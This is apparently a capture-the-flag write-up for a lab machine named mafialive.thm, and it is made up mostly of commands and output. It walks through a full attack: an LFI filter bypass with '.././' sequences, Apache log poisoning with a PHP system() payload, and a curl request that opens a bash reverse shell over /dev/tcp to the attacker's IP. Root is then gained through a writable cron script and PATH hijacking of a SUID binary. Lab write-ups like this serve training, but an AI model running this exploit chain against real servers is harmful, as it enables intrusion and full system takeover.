# Export
```bash
export IP="10.10.104.233"
export URL="http://10.10.104.233:80/FUZZ"
```

<hr>

# Credentials
+ Web:
+ SSH:

<hr>

# RCE
+ Log poisoning

```bash
$ curl -s http://mafialive.thm/test.php\?view=/var/www/html/development_testing/.././.././.././.././.././.././var/log/apache2/access.log
...
10.4.1.61 - - [02/Sep/2021:16:21:39 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././etc/apache2/sites-available/000-default.conf HTTP/1.1" 200 1224 "-" "curl/7.74.0"
    </div>
</body>
```

+ Payload

```bash
$ nc mafialive.thm 80                             
GET /<?php system($_GET['1']); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 02 Sep 2021 11:04:03 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

+ RCE

```bash
curl -s http://mafialive.thm/test.php\?view=/var/www/html/development_testing/.././.././.././.././.././.././var/log/apache2/access.log\&1=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.4.1.61%2F80+0%3E%261%22
```

```bash
nc -nlvp 80        
listening on [any] 80 ...
connect to [10.4.1.61] from (UNKNOWN) [10.10.165.16] 39090
bash: cannot set terminal process group (397): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/development_testing$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
```bash
www-data@ubuntu:/home/archangel$ cat /etc/crontab
...
*/1 *   * * *   archangel /opt/helloworld.sh
```

```bash
www-data@ubuntu:/home/archangel$ ls -al /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```

+ Give full permission

```bash
www-data@ubuntu:/home/archangel$ echo "chmod 777 /home/archangel/*" >> /opt/helloworld.sh       
```

+ `secret` directories listing

```bash
www-data@ubuntu:/home/archangel$ ls -al secret/
total 32
drwxrwxrwx 2 archangel archangel  4096 Nov 19  2020 .
drwxrwxrwx 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
```

+ SUID

```bash
www-data@ubuntu:/home/archangel/secret$ find / -perm -u=s 2>/dev/null -ls
...
  1053235     20 -rwsr-xr-x   1 root     root          16904 Nov 18  2020 /home/archangel/secret/backup
```

+ Try executing `backup`.

```bash
www-data@ubuntu:/home/archangel/secret$ /home/archangel/secret/backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```

+ `PATH` variable injection

```bash
www-data@ubuntu:/home/archangel/secret$ echo "chmod +s /bin/bash" > cp
www-data@ubuntu:/home/archangel/secret$ chmod 777 cp
www-data@ubuntu:/home/archangel/secret$ export PATH=/home/archangel/secret:$PATH
www-data@ubuntu:/home/archangel/secret$ which cp
/home/archangel/secret/cp
```

```bash
www-data@ubuntu:/home/archangel/secret$ bash -p
bash-4.4# whoami
root
```

<hr>

# Nmap
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:         
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jz
Iow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo
3V                                                                                             
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)     
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
```

<hr>

# Web Application
+ Directory

```bash
$ ffuf -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt
flags                   [Status: 301, Size: 314, Words: 20, Lines: 10]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 19188, Words: 2646, Lines: 321]
layout                  [Status: 301, Size: 315, Words: 20, Lines: 10]
pages                   [Status: 301, Size: 314, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```

+ Host name: `mafialive.thm`

+ Robots file

```bash
$ curl http://mafialive.thm/robots.txt                                     
User-agent: *
Disallow: /test.php
```

+ `test.php`

```bash
curl -s http://mafialive.thm/test.php            
...
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
...
```

+ Source code

```bash
curl -s http://mafialive.thm/test.php\?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php | cut -d$'\n' -f10 | tr -d '[:space:]' | grep -oP ".*?(
?=<)" | base64 -d                                                                 
...
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
...
```

+ Bypass

```bash
$ curl -s http://mafialive.thm/test.php\?view=/var/www/html/development_testing/.././.././.././.././.././.././etc/passwd 
...
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
...
```
